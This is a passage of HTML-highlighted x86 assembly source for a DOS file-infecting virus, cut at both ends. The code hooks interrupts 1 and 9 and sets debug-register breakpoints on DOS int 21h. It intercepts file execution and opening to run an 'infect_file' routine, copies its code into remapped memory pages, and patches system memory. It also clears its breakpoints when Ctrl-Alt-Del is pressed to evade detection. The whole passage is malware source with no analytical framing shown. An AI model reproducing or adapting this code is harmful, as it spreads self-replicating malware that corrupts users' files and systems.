                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; Calculate physical address</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">i21h_ep</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; Save old int 21h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_breakpoints</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">infecting</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; Flag: can infect files</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">page_1</span><span class="sc0">           </span><span class="sc1">; Insert vir page in page table</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">][</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">orig_i1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; Int 1h (trace)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">pm_int_1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">build_idt_descriptor</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">; offset(orig_i9)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                   </span><span class="sc1">; Int 9h </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">pm_int_9</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">build_idt_descriptor</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">page_1</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">     
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F3h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">0A5h</span><span class="sc0">       </span><span class="sc1">; rep movsd (TASM FIX)</span><span class="sc0">
                                                </span><span class="sc1">; Copy (4k) to virus page</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">saved_sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">virus_cs</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; GS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; FS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; DS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; ES</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">saved_ss</span><span class="sc0">                </span><span class="sc1">; SS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; ESP</span><span class="sc0">
                </span><span class="sc6">pushfd</span><span class="sc0">                          </span><span class="sc1">; Flags</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">; CS</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">free_virmem</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; EIP</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0DE0Ch</span><span class="sc0">       </span><span class="sc1">; Switch to protected mode (v86 mode)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">pm_ep</span><span class="sc0">


</span><span class="sc5">pm_int_9</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">dr7</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000001100001010b</span><span class="sc0">    </span><span class="sc1">; Check breakpoints</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0000001100001010b</span><span class="sc0">    </span><span class="sc1">; Removed?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_ctrlaltdel</span><span class="sc0">        </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_breakpoints</span><span class="sc0">         </span><span class="sc1">; else restore them</span><span class="sc0">
</span><span class="sc5">check_ctrlaltdel</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">          </span><span class="sc1">; Read scan code from keyboard</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">53h</span><span class="sc0">          </span><span class="sc1">; DEL key?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exit_pm9</span><span class="sc0">        </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">417h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get keyboard status (0:417h)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ch</span><span class="sc0">          </span><span class="sc1">; CTRL &amp; ALT pressed?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">exit_pm9</span><span class="sc0">        </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dr7</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Remove breakpoints if reset</span><span class="sc0">
</span><span class="sc5">exit_pm9</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">orig_i9</span><span class="sc0">

</span><span class="sc5">exit_pm1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">orig_i1</span><span class="sc0">


</span><span class="sc5">pm_int_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">dr6</span><span class="sc0">         </span><span class="sc1">; Test breakpoint number</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">; Breakpoint 0 or 1?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">exit_pm1</span><span class="sc0">        </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Breakpoint 1?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">dos_bp</span><span class="sc0">          </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Else breakpoint 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dr7</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Remove breakpoints</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">iretd</span><span class="sc0">   

</span><span class="sc5">dos_bp</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dr6</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Clear dr6 (never cleared by CPU)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; Set RF in stack</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0BABAh</span><span class="sc0">       </span><span class="sc1">; Residency check?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">check_function</span><span class="sc0">  </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FACCh</span><span class="sc0">       </span><span class="sc1">; DOS will try to exec function 0FACCh</span><span class="sc0">
                                        </span><span class="sc1">;  but it doesn't exist, then DOS will</span><span class="sc0">
                                        </span><span class="sc1">;  return 0FA00h</span><span class="sc0">
</span><span class="sc5">_iretd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">iretd</span><span class="sc0">   

</span><span class="sc5">check_function</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3506h</span><span class="sc0">        </span><span class="sc1">; Get int 6 vector?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_patch</span><span class="sc0">     </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4B00h</span><span class="sc0">        </span><span class="sc1">; Exec file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_prev_inf</span><span class="sc0">  </span><span class="sc1">; Yes? then jmp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">          </span><span class="sc1">; Open file?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">_iretd</span><span class="sc0">          </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">; For reading?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">_iretd</span><span class="sc0">          </span><span class="sc1">; No? then jmp</span><span class="sc0">
</span><span class="sc5">check_prev_inf</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">infecting</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">; Exist a copy for infection?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">kill_copy4infection</span><span class="sc0">     </span><span class="sc1">; Yes? Kill it (finished work)</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">  
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">page_1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">         </span><span class="sc1">; Segment 90h (phys. 90000h)</span><span class="sc0">
</span><span class="sc5">l_map_page234</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">page_2</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">map_page</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">9Ch</span><span class="sc4">,</span><span class="sc2">0A9h</span><span class="sc0">    </span><span class="sc1">; (TASM FIX)</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">old_pages</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; mov [ecx+old_pages][ebp*4],ebx</span><span class="sc0">
                                                </span><span class="sc1">; Store old page</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; Next 4KB</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                      </span><span class="sc1">; Next page</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                    </span><span class="sc1">; Pages 2,3 and 4 in page table?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">l_map_page234</span><span class="sc0">           </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">page_1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">90000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">infecting</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">STACK_SIZE</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">    </span><span class="sc1">; moc [esi+_esp],esp (TASM FIX)</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">     
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">                </span><span class="sc1">; 4KB</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F3h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">0A5h</span><span class="sc0">       </span><span class="sc1">; rep movsd (TASM FIX)</span><span class="sc0">
                                                </span><span class="sc1">; Copy code</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">page_1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">STACK_SIZE</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F3h</span><span class="sc4">,</span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">0A5h</span><span class="sc0">       </span><span class="sc1">; rep movsd (TASM FIX)</span><span class="sc0">
                                                </span><span class="sc1">; Copy stack</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">   
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">9000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; GS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; FS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DS</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ES</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; SS</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">66h</span><span class="sc0">                     </span><span class="sc1">; (TASM FIX) PUSH 0FFFEh (dword)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0FFEh</span><span class="sc0">                   </span><span class="sc1">; ESP</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">; (TASM FIX)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">23000h</span><span class="sc0">                  </span><span class="sc1">; EFLAGS (VM 8086, RPL 3)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; CS</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">infect_file</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; EIP</span><span class="sc0">
                </span><span class="sc6">iretd</span><span class="sc0">                   </span><span class="sc1">; Jump to infect_file task, pm level 3</span><span class="sc0">

</span><span class="sc5">check_patch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; DS = CS</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">memory_patch</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; Number of patches</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">     
</span><span class="sc5">search_code</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">90000h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">search_patch</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">skip_patch</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Maybe the code it's searching</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">search_patch</span><span class="sc0">            </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">edi</span><span class="sc4">][</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">       </span><span class="sc1">; Code found?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">search_patch</span><span class="sc0">            </span><span class="sc1">; No? then jmp</span><span class="sc0">
                </span><span class="sc6">movsx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Offset to the patch</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Number of bytes to patch</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">start_patch1</span><span class="sc4">-</span><span class="sc5">memory_patch</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F3h</span><span class="sc4">,</span><span class="sc2">67h</span><span class="sc4">,</span><span class="sc2">0A4h</span><span class="sc0">           </span><span class="sc1">; rep movsb (TASM FIX)</span><span class="sc0">
                                                </span><span class="sc1">; Patch it</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_patch</span><span class="sc0">


</span><span class="sc5">skip_patch</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Point next patch</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
